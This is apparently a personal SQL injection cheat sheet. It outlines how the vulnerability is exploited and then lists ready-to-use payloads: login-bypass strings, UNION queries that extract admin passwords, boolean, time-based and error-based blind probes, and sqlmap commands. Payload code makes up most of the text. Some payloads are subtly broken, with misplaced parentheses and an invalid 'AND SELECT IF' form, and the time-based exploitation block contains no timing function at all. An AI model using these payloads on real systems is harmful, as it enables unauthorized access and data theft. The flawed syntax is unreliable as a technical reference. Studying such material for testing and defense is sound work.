
# SQL Injection

---

SQL Injection is a vulnerability that permits the attacker access private data on DBMS, is a 
part of **OWASP TOP 10** on injection section a side of XSS and Command Injection, because is a 
vulnerability injection based, can be considered a critical vulnerability because permits the 
attacker exfiltrate data from DBMS and depending on the case also permits the attacker schedule
to a reverse shell permiting remote code execution.

Thinking on web context, SQLi can occurs on everywhere input or data can be sended to database
for example: inputs data camps without correct sanitization on backend, Cookies, poor
authentication check, POST arguments and GET arguments

Understand how this kind of vuln occurs we can implement mitigations as a good sanitizer on 
backend, strong authentication methods such as JWT or OAuth.

---

## Exploitation proccess

1. Identity And Validate (Generally in GET/POST Requests and parameters and Inputs)
2. Discover the Database name
3. Discover the Tables name
4. Discover the Columns name
5. Exfiltrate data from the Database
6. Extra: Try to get a reverse shell or exploit other vulns as XXE and SSRF

---
# Tips and Tricks


**MySQL, Postgres and MSSQL**

- INFORMATION_SCHEMA
    .schemata
    .tables
    .columns

**Extra: Postgress**
- pg_catalog
    .pg_tables
    .pg_catalog


```sql
ORDER BY <1-5...>
SELECT NULL, NULL...

CONCAT(column1, ":", column2)
GROUP_CONCAT(column SEPARATOR ";")  <- useful to blind sqli: data1;data2;data3
SUBSTR(data or (query), 1, 1)
SELECT SLEEP(5)

IF((Condition), <case_true>, <case_false>)
or
SELECT CASE WHEN (Condition) THEN <case_true> ELSE <case_false> END
```

---

## SQLi Types

- #### Broken Access Authentication
    *Abuse from SELECT logic, this kind of query generally utilize WHERE clause and Logic which can be modified to bypass the logins screens*

```mysql
' or '1'='1'-- -
1 or 1=1-- -
admin' and '1'='1 
...
```

---

- #### Union Attacks
    *On this context generally the data which is sent from back-end is a index that will display some data correspondent, as a "SELECT" but with much more columns.... we can use some payloads to identify the quantity of columns that are selected and after this start to enumerate, because where the data selected should be, the new malicious query will return our data on this places*
    
```mysql
# Identifying

' ORDER BY <1-5...> 
' UNION SELECT NULL, NULL, NULL, ... 
```

```mysql
#Exploiting

' UNION SELECT NULL, c_password, NULL FROM tb_users WHERE c_username = 'admin'#
' UNION SELECT CONCAT(c_username, ':', c_password) FROM tb_users WHERE c_username = 'admin'-- -
```

---

- #### Blind SQL Injection With Conditional Responses
    *On this context we need to use conditions or as i like to say... yes or not questions based... such as... the first letter of data extracted is f? Using this logic and some select concatenations statements to make the query run.*

```mysql
#Identifiyng

data' AND SELECT IF((1=1), true, false)-- -
data' UNION SELECT IF((1=1), true, false)-- -
data' UNION SELECT IF((1=1), true, false) %23
```

```mysql
#Exploiting

' AND SELECT IF(SUBSTR((SELECT database(), 1, 1) = 'a'), true, false)-- -

xyz" AND SELECT IF(SUBSTR((SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = database()), 1, 1) = 'a', true, false) 

xyz" AND SELECT IF(SUBSTR((SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = database()), 1, 1) = 'a', true, false) %23
```

---

- #### Time-Based Blind SQL Injection With 
    *its a vulnerability that uses query time functions to spot the flaw the consequently remount across database*

```mysql
#Identifying

' OR SLEEP(5)
admin' and SLEEP(5)
```

```mysql
# Exploiting
' AND SELECT IF(SUBSTR((SELECT database(), 1, 1) = 'a'), true, false)-- -

xyz" AND SELECT IF(SUBSTR((SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = database()), 1, 1) = 'a', true, false)-- -
```

---

- #### SQL Injection Error Based
    *Diferently the past vulnerabilities, this kind have a feedback or well saying a error message after the query try.*

```mysql
#Identifying
 ' 
 \
 ' union select 1, 2, 3... %23    
```

```mysql
#Exploiting 
 ' AND 1=CAST((SELECT 1) AS INT) %23
 ' AND 1=CAST((SELECT c_user FROM t_users) as INT)-- -
 ```

---

##### SQLMAP

The most popular tool to exploit SQL Injection, comes for default on kali linux.

```bash
sqlmap -u http://<url> --random-agent 
sqlmap -u http://<url> --random-agent --delay --threads=1 --level=1 --risk=1
```

